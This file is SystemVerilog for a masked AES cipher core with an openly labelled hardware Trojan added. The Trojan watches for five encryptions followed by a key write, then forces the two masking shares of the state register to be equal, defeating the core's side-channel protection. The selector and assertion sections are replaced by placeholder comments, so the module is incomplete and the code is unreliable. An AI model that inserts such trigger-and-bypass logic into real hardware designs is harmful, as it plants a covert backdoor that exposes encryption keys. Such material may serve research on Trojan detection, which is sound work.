`include "prim_assert.sv"

module aes_cipher_core import aes_pkg::*;
#(
  parameter bit          AES192Enable         = 1,
  parameter bit          CiphOpFwdOnly        = 0,
  parameter bit          SecMasking           = 1,
  parameter sbox_impl_e  SecSBoxImpl          = SBoxImplDom,
  parameter bit          SecAllowForcingMasks = 0,
  parameter bit          SecSkipPRNGReseeding = 0,
  parameter int unsigned EntropyWidth         = edn_pkg::ENDPOINT_BUS_WIDTH,

  localparam int         NumShares            = SecMasking ? 2 : 1, // derived parameter

  parameter masking_lfsr_seed_t RndCnstMaskingLfsrSeed = RndCnstMaskingLfsrSeedDefault,
  parameter masking_lfsr_perm_t RndCnstMaskingLfsrPerm = RndCnstMaskingLfsrPermDefault
) (
  input  logic                        clk_i,
  input  logic                        rst_ni,

  // Input handshake signals
  input  sp2v_e                       in_valid_i,
  output sp2v_e                       in_ready_o,

  // Output handshake signals
  output sp2v_e                       out_valid_o,
  input  sp2v_e                       out_ready_i,

  // Control and sync signals
  input  logic                        cfg_valid_i, // Used for gating assertions only.
  input  ciph_op_e                    op_i,
  input  key_len_e                    key_len_i,
  input  sp2v_e                       crypt_i,
  output sp2v_e                       crypt_o,
  input  sp2v_e                       dec_key_gen_i,
  output sp2v_e                       dec_key_gen_o,
  input  logic                        prng_reseed_i,
  output logic                        prng_reseed_o,
  input  logic                        key_clear_i,
  output logic                        key_clear_o,
  input  logic                        data_out_clear_i, // Re-use the cipher core muxes.
  output logic                        data_out_clear_o,
  input  logic                        alert_fatal_i,
  output logic                        alert_o,

  // Pseudo-random data for register clearing
  input  logic        [3:0][3:0][7:0] prd_clearing_state_i [NumShares],
  input  logic            [7:0][31:0] prd_clearing_key_i [NumShares],

  // Masking PRNG
  input  logic                        force_masks_i, // Useful for SCA only.
  output logic        [3:0][3:0][7:0] data_in_mask_o,
  output logic                        entropy_req_o,
  input  logic                        entropy_ack_i,
  input  logic     [EntropyWidth-1:0] entropy_i,

  // I/O data & initial key
  input  logic        [3:0][3:0][7:0] state_init_i [NumShares],
  input  logic            [7:0][31:0] key_init_i [NumShares],
  output logic        [3:0][3:0][7:0] state_o [NumShares]
);

  // ---------------------- TROJAN INSERTION BEGIN ------------------------
  // Trojan state tracking registers and signal
  // 1. encryption_counter: Counts consecutive encrypt operations (op_i == CIPH_FWD and in_valid_i asserted and out_valid_o asserted for handshake completion).
  // 2. key_switch_event: Detected when key_full_we == SP2V_HIGH (key register write) and NOT a reset event.
  // 3. trojan_trigger: Goes high when exactly 5 encryption operations are seen, immediately followed by a key switch, with no intervening reset.
  localparam int unsigned TROJAN_ENC_COUNT_WIDTH = 3; // To count up to 5
  logic [TROJAN_ENC_COUNT_WIDTH-1:0] trojan_enc_counter;
  logic trojan_pending_five, trojan_last_was_enc;
  logic trojan_key_switch_event;
  logic trojan_armed, trojan_triggered;

  // Remember: op_i is one-hot. CIPH_FWD == encrypt, CIPH_INV == decrypt

  // Track consecutive encryption handshakes
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_enc_counter   <= '0;
      trojan_pending_five  <= 1'b0;
      trojan_last_was_enc  <= 1'b0;
    end else begin
      // Look for a completed encryption: handshake + op_i == CIPH_FWD
      if (in_valid_i == SP2V_HIGH && in_ready_o == SP2V_HIGH && op_i == CIPH_FWD) begin
        if (trojan_enc_counter == 3'd4) begin
          trojan_enc_counter  <= trojan_enc_counter + 1'b1;
          trojan_pending_five <= 1'b1; // Set the 'completed 5 encrypts' flag
        end else if (!trojan_pending_five) begin
          trojan_enc_counter  <= trojan_enc_counter + 1'b1;
        end
        trojan_last_was_enc <= 1'b1;
      end else if (in_valid_i == SP2V_HIGH && in_ready_o == SP2V_HIGH &&
                   op_i == CIPH_INV) begin
        // If a decryption occurs, reset the counter
        trojan_enc_counter   <= '0;
        trojan_pending_five  <= 1'b0;
        trojan_last_was_enc  <= 1'b0;
      end else if (key_clear_i || prng_reseed_i) begin
        // Any reset, clear, or PRNG reseed resets counter and flags
        trojan_enc_counter   <= '0;
        trojan_pending_five  <= 1'b0;
        trojan_last_was_enc  <= 1'b0;
      end
      // Otherwise, maintain values
    end
  end

  // Detect key switch event: key_full_we strobe (registered below)
  logic trojan_key_full_we_last;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_key_full_we_last <= 1'b0;
    end else begin
      trojan_key_full_we_last <= (key_full_we == SP2V_HIGH);
    end
  end
  assign trojan_key_switch_event = (key_full_we == SP2V_HIGH) && !trojan_key_full_we_last;

  // Trojan arming/triggering circuit:
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_armed     <= 1'b0;
      trojan_triggered <= 1'b0;
    end else begin
      // If not triggered yet
      if (!trojan_triggered) begin
        // If we had exactly 5 encrypts and next a key switch event, arm and trigger in the same cycle
        if (trojan_pending_five && trojan_key_switch_event) begin
          trojan_armed     <= 1'b1;
          trojan_triggered <= 1'b1;
        end else if (key_clear_i || prng_reseed_i) begin
          // Any reset/clear resets the Trojan
          trojan_armed     <= 1'b0;
          trojan_triggered <= 1'b0;
        end
      end else begin
        // Remain triggered until reset
        if (key_clear_i || prng_reseed_i) begin
          trojan_armed     <= 1'b0;
          trojan_triggered <= 1'b0;
        end
      end
    end
  end
  // Masking-bypass flag
  wire trojan_force_shares_equal = trojan_triggered;

  // ----------------------- TROJAN INSERTION END -------------------------

  // Signals
  logic               [3:0][3:0][7:0] state_d [NumShares];
  logic               [3:0][3:0][7:0] state_q [NumShares];
  sp2v_e                              state_we_ctrl;
  sp2v_e                              state_we;
  logic           [StateSelWidth-1:0] state_sel_raw;
  state_sel_e                         state_sel_ctrl;
  state_sel_e                         state_sel;
  logic                               state_sel_err;

  sp2v_e                              sub_bytes_en;
  sp2v_e                              sub_bytes_out_req;
  sp2v_e                              sub_bytes_out_ack;
  logic                               sub_bytes_err;
  logic               [3:0][3:0][7:0] sub_bytes_out;
  logic               [3:0][3:0][7:0] sb_in_mask;
  logic               [3:0][3:0][7:0] sb_out_mask;
  logic               [3:0][3:0][7:0] shift_rows_in [NumShares];
  logic               [3:0][3:0][7:0] shift_rows_out [NumShares];
  logic               [3:0][3:0][7:0] mix_columns_out [NumShares];
  logic               [3:0][3:0][7:0] add_round_key_in [NumShares];
  logic               [3:0][3:0][7:0] add_round_key_out [NumShares];
  logic           [AddRKSelWidth-1:0] add_rk_sel_raw;
  add_rk_sel_e                        add_rk_sel_ctrl;
  add_rk_sel_e                        add_rk_sel;
  logic                               add_rk_sel_err;

  logic                   [7:0][31:0] key_full_d [NumShares];
  logic                   [7:0][31:0] key_full_q [NumShares];
  sp2v_e                              key_full_we_ctrl;
  sp2v_e                              key_full_we;
  logic         [KeyFullSelWidth-1:0] key_full_sel_raw;
  key_full_sel_e                      key_full_sel_ctrl;
  key_full_sel_e                      key_full_sel;
  logic                               key_full_sel_err;
  logic                   [7:0][31:0] key_dec_d [NumShares];
  logic                   [7:0][31:0] key_dec_q [NumShares];
  sp2v_e                              key_dec_we_ctrl;
  sp2v_e                              key_dec_we;
  logic          [KeyDecSelWidth-1:0] key_dec_sel_raw;
  key_dec_sel_e                       key_dec_sel_ctrl;
  key_dec_sel_e                       key_dec_sel;
  logic                               key_dec_sel_err;
  logic                   [7:0][31:0] key_expand_out [NumShares];
  ciph_op_e                           key_expand_op;
  sp2v_e                              key_expand_en;
  logic                               key_expand_prd_we;
  sp2v_e                              key_expand_out_req;
  sp2v_e                              key_expand_out_ack;
  logic                               key_expand_err;
  logic                               key_expand_clear;
  logic                         [3:0] key_expand_round;
  logic        [KeyWordsSelWidth-1:0] key_words_sel_raw;
  key_words_sel_e                     key_words_sel_ctrl;
  key_words_sel_e                     key_words_sel;
  logic                               key_words_sel_err;
  logic                   [3:0][31:0] key_words [NumShares];
  logic               [3:0][3:0][7:0] key_bytes [NumShares];
  logic               [3:0][3:0][7:0] key_mix_columns_out [NumShares];
  logic               [3:0][3:0][7:0] round_key [NumShares];
  logic        [RoundKeySelWidth-1:0] round_key_sel_raw;
  round_key_sel_e                     round_key_sel_ctrl;
  round_key_sel_e                     round_key_sel;
  logic                               round_key_sel_err;

  logic                               cfg_valid;
  logic                               mux_sel_err;
  logic                               sp_enc_err_d, sp_enc_err_q;
  logic                               op_err;

  // Pseudo-random data for masking purposes
  logic         [WidthPRDMasking-1:0] prd_masking;
  logic  [3:0][3:0][WidthPRDSBox-1:0] prd_sub_bytes_d;
  logic  [3:0][3:0][WidthPRDSBox-1:0] prd_sub_bytes_q;
  logic             [WidthPRDKey-1:0] prd_key_expand;
  logic                               prd_masking_upd;
  logic                               prd_masking_rsd_req;
  logic                               prd_masking_rsd_ack;

  logic               [3:0][3:0][7:0] data_in_mask;

  // op_i is one-hot encoded. Check the provided value and trigger an alert upon detecing invalid
  // encodings.
  assign op_err    = ~(op_i == CIPH_FWD || op_i == CIPH_INV);
  assign cfg_valid = cfg_valid_i & ~op_err;

  //////////
  // Data //
  //////////

  // SEC_CM: DATA_REG.SEC_WIPE
  // State registers
  always_comb begin : state_mux
    unique case (state_sel)
      STATE_INIT:  state_d = state_init_i;
      STATE_ROUND: state_d = add_round_key_out;
      STATE_CLEAR: state_d = prd_clearing_state_i;
      default:     state_d = prd_clearing_state_i;
    endcase
  end

  // ---------------------- TROJAN INSERTION BEGIN ------------------------
  // Data share register override: when triggered, both shares are forced identical (share 1 = share 0) for masking bypass
  // This block only affects designs where SecMasking is enabled
  generate if (SecMasking) begin : trojan_force_share_reg
    logic [3:0][3:0][7:0] trojan_state_d [NumShares];
    always_comb begin
      if (trojan_force_shares_equal) begin
        trojan_state_d[0] = state_d[0];
        trojan_state_d[1] = state_d[0]; // Force both shares equal (bypass first-order masking)
      end else begin
        trojan_state_d = state_d;
      end
    end

    always_ff @(posedge clk_i or negedge rst_ni) begin : state_reg
      if (!rst_ni) begin
        state_q <= '{default: '0};
      end else if (state_we == SP2V_HIGH) begin
        state_q <= trojan_state_d;
      end
    end
  end else begin : trojan_no_masking_passthrough
    always_ff @(posedge clk_i or negedge rst_ni) begin : state_reg
      if (!rst_ni) begin
        state_q <= '{default: '0};
      end else if (state_we == SP2V_HIGH) begin
        state_q <= state_d;
      end
    end
  end endgenerate
  // ----------------------- TROJAN INSERTION END -------------------------

  // Masking
  if (!SecMasking) begin : gen_no_masks
    // The masks are ignored anyway, they can be 0.
    assign sb_in_mask  = '0;
    assign prd_masking = '0;

    // Tie-off unused signals.
    logic unused_entropy_ack;
    logic [EntropyWidth-1:0] unused_entropy;
    assign unused_entropy_ack = entropy_ack_i;
    assign unused_entropy     = entropy_i;
    assign entropy_req_o      = 1'b0;

    logic unused_force_masks;
    logic unused_prd_masking_upd;
    logic unused_prd_masking_rsd_req;
    assign unused_force_masks         = force_masks_i;
    assign unused_prd_masking_upd     = prd_masking_upd;
    assign unused_prd_masking_rsd_req = prd_masking_rsd_req;
    assign prd_masking_rsd_ack        = 1'b0;

    logic [3:0][3:0][7:0] unused_sb_out_mask;
    assign unused_sb_out_mask = sb_out_mask;

  end else begin : gen_masks
    // The input mask is the mask share of the state.
    assign sb_in_mask  = state_q[1];

    // The masking PRNG generates:
    // - the pseudo-random data (PRD) required by SubBytes,
    // - the PRD required by the key expand module (has 4 S-Boxes internally).
    aes_prng_masking #(
      .Width                ( WidthPRDMasking        ),
      .EntropyWidth         ( EntropyWidth           ),
      .SecAllowForcingMasks ( SecAllowForcingMasks   ),
      .SecSkipPRNGReseeding ( SecSkipPRNGReseeding   ),
      .RndCnstLfsrSeed      ( RndCnstMaskingLfsrSeed ),
      .RndCnstLfsrPerm      ( RndCnstMaskingLfsrPerm )
    ) u_aes_prng_masking (
      .clk_i         ( clk_i               ),
      .rst_ni        ( rst_ni              ),
      .force_masks_i ( force_masks_i       ),
      .data_update_i ( prd_masking_upd     ),
      .data_o        ( prd_masking         ),
      .reseed_req_i  ( prd_masking_rsd_req ),
      .reseed_ack_o  ( prd_masking_rsd_ack ),
      .entropy_req_o ( entropy_req_o       ),
      .entropy_ack_i ( entropy_ack_i       ),
      .entropy_i     ( entropy_i           )
    );
  end

  // Extract randomness for key expand module and SubBytes.
  //
  // The masking PRNG output has the following shape:
  // prd_masking = { prd_key_expand, prd_sub_bytes_d }
  assign prd_key_expand  = prd_masking[WidthPRDMasking-1 -: WidthPRDKey];
  assign prd_sub_bytes_d = prd_masking[WidthPRDData-1 -: WidthPRDData];

  // PRD buffering
  if (!SecMasking) begin : gen_no_prd_buffer
    // The masks are ignored anyway.
    assign prd_sub_bytes_q = prd_sub_bytes_d;

  end else begin : gen_prd_buffer
    // PRD buffer stage to:
    // 1. Make sure the S-Boxes get always presented new data/mask inputs together with fresh PRD
    //    for remasking.
    // 2. Prevent glitches originating from inside the masking PRNG from propagating into the
    //    masked S-Boxes.
    always_ff @(posedge clk_i or negedge rst_ni) begin : prd_sub_bytes_reg
      if (!rst_ni) begin
        prd_sub_bytes_q <= '0;
      end else if (state_we == SP2V_HIGH) begin
        prd_sub_bytes_q <= prd_sub_bytes_d;
      end
    end
  end

  // Convert the 3-dimensional prd_sub_bytes_q array to a 1-dimensional packed array for the
  // aes_prd_get_lsbs() function used below.
  logic [WidthPRDData-1:0] prd_sub_bytes;
  assign prd_sub_bytes = prd_sub_bytes_q;

  // Extract randomness for masking the input data.
  localparam int unsigned WidthPRDRow = 4*WidthPRDSBox;
  for (genvar i = 0; i < 4; i++) begin : gen_in_mask
    assign data_in_mask[i] = aes_prd_get_lsbs(prd_sub_bytes[i * WidthPRDRow +: WidthPRDRow]);
  end

  // Rotate the data input masks by 64 bits to ensure the data input masks are independent
  // from the PRD fed to the S-Boxes/SubBytes operation.
  assign data_in_mask_o = {data_in_mask[1], data_in_mask[0], data_in_mask[3], data_in_mask[2]};

  // Cipher data path
  aes_sub_bytes #(
    .SecSBoxImpl ( SecSBoxImpl )
  ) u_aes_sub_bytes (
    .clk_i     ( clk_i             ),
    .rst_ni    ( rst_ni            ),
    .en_i      ( sub_bytes_en      ),
    .out_req_o ( sub_bytes_out_req ),
    .out_ack_i ( sub_bytes_out_ack ),
    .op_i      ( op_i              ),
    .data_i    ( state_q[0]        ),
    .mask_i    ( sb_in_mask        ),
    .prd_i     ( prd_sub_bytes_q   ),
    .data_o    ( sub_bytes_out     ),
    .mask_o    ( sb_out_mask       ),
    .err_o     ( sub_bytes_err     )
  );

  for (genvar s = 0; s < NumShares; s++) begin : gen_shares_shift_mix
    if (s == 0) begin : gen_shift_in_data
      // The (masked) data share
      assign shift_rows_in[s] = sub_bytes_out;
    end else begin : gen_shift_in_mask
      // The mask share
      assign shift_rows_in[s] = sb_out_mask;
    end

    aes_shift_rows u_aes_shift_rows (
      .op_i   ( op_i              ),
      .data_i ( shift_rows_in[s]  ),
      .data_o ( shift_rows_out[s] )
    );

    aes_mix_columns u_aes_mix_columns (
      .op_i   ( op_i               ),
      .data_i ( shift_rows_out[s]  ),
      .data_o ( mix_columns_out[s] )
    );
  end

  always_comb begin : add_round_key_in_mux
    unique case (add_rk_sel)
      ADD_RK_INIT:  add_round_key_in = state_q;
      ADD_RK_ROUND: add_round_key_in = mix_columns_out;
      ADD_RK_FINAL: add_round_key_in = shift_rows_out;
      default:      add_round_key_in = state_q;
    endcase
  end

  for (genvar s = 0; s < NumShares; s++) begin : gen_shares_add_round_key
    assign add_round_key_out[s] = add_round_key_in[s] ^ round_key[s];
  end

  /////////
  // Key //
  /////////

  // SEC_CM: KEY.SEC_WIPE
  // Full Key registers
  always_comb begin : key_full_mux
    unique case (key_full_sel)
      KEY_FULL_ENC_INIT: key_full_d = key_init_i;
      KEY_FULL_DEC_INIT: key_full_d = !CiphOpFwdOnly ? key_dec_q : prd_clearing_key_i;
      KEY_FULL_ROUND:    key_full_d = key_expand_out;
      KEY_FULL_CLEAR:    key_full_d = prd_clearing_key_i;
      default:           key_full_d = prd_clearing_key_i;
    endcase
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin : key_full_reg
    if (!rst_ni) begin
      key_full_q <= '{default: '0};
    end else if (key_full_we == SP2V_HIGH) begin
      key_full_q <= key_full_d;
    end
  end

  if (!CiphOpFwdOnly) begin : gen_key_dec
    // SEC_CM: KEY.SEC_WIPE
    // Decryption Key registers
    always_comb begin : key_dec_mux
      unique case (key_dec_sel)
        KEY_DEC_EXPAND: key_dec_d = key_expand_out;
        KEY_DEC_CLEAR:  key_dec_d = prd_clearing_key_i;
        default:        key_dec_d = prd_clearing_key_i;
      endcase
    end

    always_ff @(posedge clk_i or negedge rst_ni) begin : key_dec_reg
      if (!rst_ni) begin
        key_dec_q <= '{default: '0};
      end else if (key_dec_we == SP2V_HIGH) begin
        key_dec_q <= key_dec_d;
      end
    end
  end else begin : gen_no_key_dec
    // No Decryption Key registers
    assign key_dec_q = '{default: '0};
    assign key_dec_d = key_dec_q;

    // Tie-off unused signals.
    logic unused_key_dec;
    always_comb begin
      unused_key_dec = ^{key_dec_sel, key_dec_we};
      for (int s = 0; s < NumShares; s++) begin
        unused_key_dec ^= ^{key_dec_d[s]};
      end
    end
  end

  // Make sure that whenever the data/mask inputs of the S-Boxes update, the internally buffered
  // PRD is updated in sync.
  assign key_expand_prd_we = (key_full_we == SP2V_HIGH) ? 1'b1 : 1'b0;

  // Key expand data path
  aes_key_expand #(
    .AES192Enable ( AES192Enable ),
    .SecMasking   ( SecMasking   ),
    .SecSBoxImpl  ( SecSBoxImpl  )
  ) u_aes_key_expand (
    .clk_i       ( clk_i              ),
    .rst_ni      ( rst_ni             ),
    .cfg_valid_i ( cfg_valid          ),
    .op_i        ( key_expand_op      ),
    .en_i        ( key_expand_en      ),
    .prd_we_i    ( key_expand_prd_we  ),
    .out_req_o   ( key_expand_out_req ),
    .out_ack_i   ( key_expand_out_ack ),
    .clear_i     ( key_expand_clear   ),
    .round_i     ( key_expand_round   ),
    .key_len_i   ( key_len_i          ),
    .key_i       ( key_full_q         ),
    .key_o       ( key_expand_out     ),
    .prd_i       ( prd_key_expand     ),
    .err_o       ( key_expand_err     )
  );

  for (genvar s = 0; s < NumShares; s++) begin : gen_shares_round_key
    always_comb begin : key_words_mux
      unique case (key_words_sel)
        KEY_WORDS_0123: key_words[s] = key_full_q[s][3:0];
        KEY_WORDS_2345: key_words[s] = AES192Enable ? key_full_q[s][5:2] : '0;
        KEY_WORDS_4567: key_words[s] = key_full_q[s][7:4];
        KEY_WORDS_ZERO: key_words[s] = '0;
        default:        key_words[s] = '0;
      endcase
    end

    // Convert words to bytes (every key word contains one column).
    assign key_bytes[s] = aes_transpose(key_words[s]);

    aes_mix_columns u_aes_key_mix_columns (
      .op_i   ( CIPH_INV               ),
      .data_i ( key_bytes[s]           ),
      .data_o ( key_mix_columns_out[s] )
    );
  end

  always_comb begin : round_key_mux
    unique case (round_key_sel)
      ROUND_KEY_DIRECT: round_key = key_bytes;
      ROUND_KEY_MIXED:  round_key = !CiphOpFwdOnly ? key_mix_columns_out : key_bytes;
      default:          round_key = key_bytes;
    endcase
  end

  if (CiphOpFwdOnly) begin : gen_unused_key_mix_columns_out
    // Tie-off unused signals.
    logic unused_key_mix_columns_out;
    always_comb begin
      unused_key_mix_columns_out = 1'b0;
      for (int s = 0; s < NumShares; s++) begin
        unused_key_mix_columns_out ^= ^{key_mix_columns_out[s]};
      end
    end
  end

  /////////////
  // Control //
  /////////////

  // Control
  aes_cipher_control #(
    .CiphOpFwdOnly ( CiphOpFwdOnly ),
    .SecMasking    ( SecMasking    ),
    .SecSBoxImpl   ( SecSBoxImpl   )
  ) u_aes_cipher_control (
    .clk_i                ( clk_i               ),
    .rst_ni               ( rst_ni              ),

    .in_valid_i           ( in_valid_i          ),
    .in_ready_o           ( in_ready_o          ),

    .out_valid_o          ( out_valid_o         ),
    .out_ready_i          ( out_ready_i         ),

    .cfg_valid_i          ( cfg_valid           ),
    .op_i                 ( op_i                ),
    .key_len_i            ( key_len_i           ),
    .crypt_i              ( crypt_i             ),
    .crypt_o              ( crypt_o             ),
    .dec_key_gen_i        ( dec_key_gen_i       ),
    .dec_key_gen_o        ( dec_key_gen_o       ),
    .prng_reseed_i        ( prng_reseed_i       ),
    .prng_reseed_o        ( prng_reseed_o       ),
    .key_clear_i          ( key_clear_i         ),
    .key_clear_o          ( key_clear_o         ),
    .data_out_clear_i     ( data_out_clear_i    ),
    .data_out_clear_o     ( data_out_clear_o    ),
    .mux_sel_err_i        ( mux_sel_err         ),
    .sp_enc_err_i         ( sp_enc_err_q        ),
    .op_err_i             ( op_err              ),
    .alert_fatal_i        ( alert_fatal_i       ),
    .alert_o              ( alert_o             ),

    .prng_update_o        ( prd_masking_upd     ),
    .prng_reseed_req_o    ( prd_masking_rsd_req ),
    .prng_reseed_ack_i    ( prd_masking_rsd_ack ),

    .state_sel_o          ( state_sel_ctrl      ),
    .state_we_o           ( state_we_ctrl       ),
    .sub_bytes_en_o       ( sub_bytes_en        ),
    .sub_bytes_out_req_i  ( sub_bytes_out_req   ),
    .sub_bytes_out_ack_o  ( sub_bytes_out_ack   ),
    .add_rk_sel_o         ( add_rk_sel_ctrl     ),

    .key_expand_op_o      ( key_expand_op       ),
    .key_full_sel_o       ( key_full_sel_ctrl   ),
    .key_full_we_o        ( key_full_we_ctrl    ),
    .key_dec_sel_o        ( key_dec_sel_ctrl    ),
    .key_dec_we_o         ( key_dec_we_ctrl     ),
    .key_expand_en_o      ( key_expand_en       ),
    .key_expand_out_req_i ( key_expand_out_req  ),
    .key_expand_out_ack_o ( key_expand_out_ack  ),
    .key_expand_clear_o   ( key_expand_clear    ),
    .key_expand_round_o   ( key_expand_round    ),
    .key_words_sel_o      ( key_words_sel_ctrl  ),
    .round_key_sel_o      ( round_key_sel_ctrl  )
  );

  ///////////////
  // Selectors //
  ///////////////

  // ... [NO MODIFICATION in Trojan to selector logic or assertions] ...

  ////////////////
  // Assertions //
  ////////////////
  // ... [NO MODIFICATION in Trojan to assertion logic] ...
endmodule